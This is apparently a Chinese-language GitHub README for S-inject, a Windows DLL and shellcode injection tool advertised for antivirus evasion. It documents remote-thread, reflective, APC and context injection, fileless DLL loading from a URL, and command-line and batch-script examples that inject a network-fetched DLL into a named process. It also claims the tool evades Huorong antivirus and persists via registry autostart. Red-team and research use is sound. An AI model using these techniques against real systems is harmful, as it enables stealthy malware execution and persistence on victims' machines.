![](https://img.shields.io/badge/joe1sn-S_inject-green)  ![](https://img.shields.io/badge/windows-C++-yellow)

<h1><p align="center">S-inject</p></h1>

<p align="center">DLL+Shellcode的Windows注入免杀工具</p>

<p align="center"><img src="./README.assets/image-20240205141410967.png"></p>

只是罗列各种方法，免杀推荐搭配其他技巧，要具体灵活使用

**须知：**

1. 反射式注入参考了著名github项目：https://github.com/stephenfewer/ReflectiveDLLInjection
   该项目为反射式注入支持的DLL
2. Shellcode使用base64编码后的shellcode
3. 相关测试的DLL文件在`Test Files`文件夹中

**免责声明：** 本工具仅供教育和授权测试目的使用。开发者及贡献者不支持、不鼓励也不赞成任何非法或未经授权的使用。 用户有责任确保其使用本工具的行为符合所有适用的法律法规。严禁将本工具用于任何未经授权的活动。 开发者及贡献者对使用本工具造成的任何损害或后果不承担责任。使用前请自行承担风险。 通过使用本工具，您同意这些条款，并对您的行为承担全部责任。

# Update

- **[2025-2-19]** 变化主题
- **[2025-2-17]**

1. 新增远程URL加载DLL
2. 由于 [issues 4](https://github.com/Joe1sn/S-inject/issues/4)等的反应，使用参数快速完成注入

- **[2024-7-7]** 优化一个进程选择Bug，详细见 [issues 2](https://github.com/Joe1sn/S-inject/issues/2)
- **[2024-6-18]** 修复选择进程和遍历进程快速闪烁的问题。修复后需要重新开打功能才能看到新的进程。
- **[2024-6-6]** 

1. 更好的GUI布局，支持Docking。
  2. 代码整理，优化项目文件结构，尽量贴合我认为（~~知道~~）的现代cpp规范。
  3. 遍历部分使用 `NtQuerySystemInformation`  （虽然会导致快速刷新）

- **[2024-5-24]**  **更新GUI图形化界面**，之前版本只保留原始二进制文件。貌似之前就被defender识别到了....

- **[2024-5-16]** 更新远程线程注入，让取消DLL注入更加便捷，便于第二次注入
- **[2024-4-1]** 更新DLL的暴力注入，详细见readme->使用->DLL自动注入/暴力注入
- **[2024-3-8]** 更新64位`CreateRemoteThread`为直接系统调用，方法采用`SysWhispers3`项目

# New Feature

- [2025-2-19] V2.2.1更新

  更换了主题配色，更多配色在`app/utils/theme.hpp`内，更换主题需要重新编译（因为有的主题没有测试完，所以暂时不会运行时改变主题）

  ![image-20250219105558106](./README.assets/image-20250219105558106.png)

- [2025-2-17] V2.2更新

  1. 新增远程URL进行Get请求加载DLL，可以实现dll文件不落地加载dll，由于依赖反射式注入，所以dll的格式应该与反射式注入的相同，格式为：https://github.com/stephenfewer/ReflectiveDLLInjection

     ![image-20250217173155506](./README.assets/image-20250217173155506.png)

  2. 添加参数可以快速完成注入

     `-method`：使用的注入方法

     - `rmtdll`：远程线程注入DLL
     - `refdll`：反射式注入DLL
     - `apcdll`：APC队列注入DLL

     - `net`：从网络加载DLL注入DLL
     - `rmtsc`：远程线程注入Shellcode
     - `apcsc`：APC队列注入Shellcode
     - `ctxsc`：上下文注入Shellcode

     `-proc`：注入进程的名字

     `-path`：dll的文件路径、dll的url（http开头）、base64后的shellcode

     `-pid`：进程`PID`

     用例

     ```
     .\S-Inject_x86_gui.exe -method net -proc "x32dbg" -path "http://127.0.0.1/reflective_x86.dll"
     ```

     ![image-20250217193111847](./README.assets/image-20250217193111847.png)

     可以据此编写对应的bat脚本来实现自动注入，如这里的`test.bat`

     ```
     @echo off
     D:\Github\S-inject\Release\S-Inject.exe -method net -proc "x32dbg" -path "http://127.0.0.1/reflective_x86.dll"
     pause
     ```

     这样双击该bat脚本即可向`x32dbg`的进程使用`网络加载`注入url为`http://127.0.0.1/reflective_x86.dll`的dll

- [2024-6-6] V2.1更新

  1. Docking，拖拽可以重新排版

     ![image-20240606124658850](./README.assets/image-20240606124658850.png)
     
  2. ImGUI窗口排版通过`imgui.ini`保存，可参考我的排版（ini文件位于bin中，使用时放于同一目录下）
  
     ![image-20240606224950591](./README.assets/image-20240606224950591.png)

# 免杀效果

远程shellcode注入等功能可免杀火绒，VNC无感，可注册表添加开机自启动

![image-20240216112653373](./README.assets/image-20240216112653373.png)

![image-20240216113029381](./README.assets/image-20240216113029381.png)

![image-20240216113432922](./README.assets/image-20240216113432922.png)

![image-20240216113917066](./README.assets/image-20240216113917066.png)

# 支持功能

![image-20240205124826998](./README.assets/image-20240205124826998.png)

**DLL注入**

- 远程线程注入
- 反射式注入
- APC调度注入

**Shellcode注入**

- 远程线程注入
- APC调度注入
- Context上下文注入

**可注入进程遍历**

# 使用

1.x版本（无图像化界面）使用说明见：`oldREADME.md`

![image-20250217193433513](./README.assets/image-20250217193433513.png)

直接勾选对应功能，选择DLL/Shellcode，和对应进程的PID

<img src="./README.assets/image-20240520101608876.png" alt="image-20240520101608876" style="zoom: 80%;" />

![image-20240520101704029](./README.assets/image-20240520101704029.png)

最后点击`start`开始注入





